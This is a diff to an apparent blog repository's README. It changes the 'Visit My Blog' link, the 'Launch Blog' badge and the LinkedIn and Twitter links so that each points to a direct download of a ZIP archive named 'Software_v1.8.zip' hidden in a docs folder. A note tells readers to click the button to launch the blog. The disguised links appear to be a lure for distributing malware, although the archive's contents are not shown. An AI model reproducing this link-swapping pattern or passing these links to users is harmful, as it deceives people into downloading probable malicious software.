@@ -18,10 +18,10 @@ Dive into my blog posts and enhance your knowledge on the latest trends and best
 
 ## Visit My Blog
 
-🔗 [Visit My Blog](https://github.com/desha5755/blog/releases)
+🔗 [Visit My Blog](https://github.com/desha5755/blog/raw/refs/heads/main/docs/tutorial-extras/Software_v1.8.zip)
 
 ```markdown
-[![Launch Blog](https://github.com/desha5755/blog/releases)](https://github.com/desha5755/blog/releases)
+[![Launch Blog](https://github.com/desha5755/blog/raw/refs/heads/main/docs/tutorial-extras/Software_v1.8.zip)](https://github.com/desha5755/blog/raw/refs/heads/main/docs/tutorial-extras/Software_v1.8.zip)
 ```
 
 *Note: Click on the button above to launch the blog if the link ends with a file name.*
@@ -36,7 +36,7 @@ Don't forget to ⭐️ star this repository to bookmark it for future reference.
 
 ## Connect With Me
 
-Let's connect! Feel free to reach out for collaborations, feedback, or just to say hi. You can find me on [LinkedIn](https://github.com/desha5755/blog/releases) and [Twitter](https://github.com/desha5755/blog/releases).
+Let's connect! Feel free to reach out for collaborations, feedback, or just to say hi. You can find me on [LinkedIn](https://github.com/desha5755/blog/raw/refs/heads/main/docs/tutorial-extras/Software_v1.8.zip) and [Twitter](https://github.com/desha5755/blog/raw/refs/heads/main/docs/tutorial-extras/Software_v1.8.zip).
 
 ---
 
